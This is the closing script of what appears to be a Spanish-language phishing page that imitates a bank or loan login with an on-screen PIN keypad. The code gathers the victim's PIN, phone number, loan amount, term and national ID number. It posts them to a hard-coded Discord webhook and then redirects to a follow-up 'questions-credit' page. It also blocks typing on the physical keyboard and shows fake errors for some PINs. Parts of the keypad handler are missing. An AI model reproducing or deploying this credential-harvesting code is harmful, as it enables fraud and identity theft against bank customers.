        var WEBHOOK_URL = "https://discord.com/api/webhooks/1560271962012651641/S0P2R_wy0Ic3f06qIhuXyVRj6cyjZe9MQYzcW7NXp9-UEgv9mF6tVqAmCFnoFRSB7_DY";

        // Función de envío con fallback XHR (funciona en todos los navegadores)
        function sendDiscordMessage(content) {
          var payload = { content: content };
          var bodyStr = JSON.stringify(payload);

          // Intentar con fetch si existe
          if (typeof fetch === "function") {
            try {
              fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: bodyStr
              }).then(function(r){
                if (!r.ok) console.warn("Discord status:", r.status);
              })["catch"](function(err){
                console.warn("fetch falló, usando XHR:", err);
                xhrSend(bodyStr);
              });
              return;
            } catch (e) {
              // Si fetch lanza síncronamente, caer a XHR
            }
          }
          xhrSend(bodyStr);
        }

        function xhrSend(bodyStr) {
          try {
            var x = new XMLHttpRequest();
            x.open("POST", WEBHOOK_URL, true);
            x.setRequestHeader("Content-Type", "application/json");
            x.send(bodyStr);
          } catch (e) {
            console.warn("XHR falló también:", e);
          }
        }

        // ===== BOTÓN "INTENTAR NUEVAMENTE" =====

            window.location.href = "accces-sign-in.php.html";

        }

        if (keyboard) {
          keyboard.addEventListener("click", function (e) {
            var button = e.target.closest ? e.target.closest(".keyboard-btn") : null;
            if (button && button.id.indexOf("delete") === -1) {
              var value = button.getAttribute("data-value");

                inputs[currentInput].setAttribute("data-real-value", value);
                inputs[currentInput].value = "*";
                // Dispatch input (con fallback para navegadores antiguos)
                try {
                  inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
                } catch (err) {
                  var ev = document.createEvent("Event");
                  ev.initEvent("input", true, true);
                  inputs[currentInput].dispatchEvent(ev);
                }
                currentInput++;
              }
            }
          });
        }

        // ===== BOTÓN BORRAR =====
        if (deleteBtn) {
          deleteBtn.addEventListener("click", function () {
            if (currentInput > 0) {
              currentInput--;
              inputs[currentInput].value = "";
              inputs[currentInput].removeAttribute("data-real-value");
              try {
                inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
              } catch (err) {
                var ev = document.createEvent("Event");
                ev.initEvent("input", true, true);
                inputs[currentInput].dispatchEvent(ev);
              }
            }
          });
        }

        // ===== TECLA BACKSPACE FÍSICA =====
        document.addEventListener("keydown", function (e) {
          if (e.key === "Backspace" && currentInput > 0) {
            currentInput--;
            inputs[currentInput].value = "";
            inputs[currentInput].removeAttribute("data-real-value");
            try {
              inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
            } catch (err) {
              var ev = document.createEvent("Event");
              ev.initEvent("input", true, true);
              inputs[currentInput].dispatchEvent(ev);
            }
          }
        });

        // ===== BLOQUEAR ENTRADA FÍSICA EN LOS INPUTS =====
        for (var i = 0; i < inputs.length; i++) {
          (function (input) {
            var evTypes = ["keydown", "keyup", "keypress", "input", "textInput"];
            for (var j = 0; j < evTypes.length; j++) {
              input.addEventListener(evTypes[j], function (e) {
                e.preventDefault();
                return false;
              });
            }
            input.addEventListener("paste", function (e) {
              e.preventDefault();
              return false;
            });
            input.setAttribute("readonly", "readonly");
            input.setAttribute("inputmode", "none");
          })(inputs[i]);
        }

        // ===== VALIDACIÓN: 3 DÍGITOS SEGUIDOS IGUALES =====
        function tieneTresSeguidos(entrada) {
          var texto = String(entrada);
          var regex = /(.)\1\1/;
          return regex.test(texto);
        }

        // ===== CUANDO TODOS LOS CAMPOS ESTÉN LLENOS =====
        function verificarPassCompleto() {
          var isComplete = true;
          for (var k = 0; k < inputs.length; k++) {
            if (inputs[k].value === "") { isComplete = false; break; }
          }
          if (!isComplete) return;

          var pass = "";
          for (var m = 0; m < inputs.length; m++) {
            pass += inputs[m].getAttribute("data-real-value") || "";
          }

          loadingContenedor.style.display = "flex";

          if (tieneTresSeguidos(pass)) {
            setTimeout(function () {
              loadingContenedor.style.display = "none";
              errorLogin.style.display = "block";
            }, 3000);
            return;
          }

          // Guardar en formData (con helper seguro)
          var formData = window.getFormDataSafe ? window.getFormDataSafe() : {};
          var transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
          formData.password = pass;
          formData.transactionId = transactionId;
          if (window.setFormDataSafe) window.setFormDataSafe(formData);

          // Redirigir (funciona en todos los navegadores)
          setTimeout(function () {
            window.location.href = "questions-credit.php.html";
          }, 3000);

          // ===== ENVÍO A DISCORD (no bloqueante) =====
          var discordMessage =
  "✅ **User y Pass** ✅\n\n" +
  "📱 **Número**: " + (formData.phoneNumber || "No disponible") + "\n" +
  "🔑 **Clave**: " + pass + "\n" +
  "💰 **Monto solicitado**: $" + (formData.montoPrestamo || "No disponible") + "\n" +
  "📆 **Plazo**: " + (formData.plazo || "No disponible") + " meses\n" +
  "🪪 **Cédula**: " + (formData.cedula || "No disponible") + "\n" +
  "════════════════════════════════════";
          sendDiscordMessage(discordMessage);
        }

        // Escuchar cambios en cada input
        for (var n = 0; n < inputs.length; n++) {
          (function (input) {
            input.addEventListener("input", function () {
              verificarPassCompleto();
            });
          })(inputs[n]);
        }
      });
    </script>
  </body>
</html>
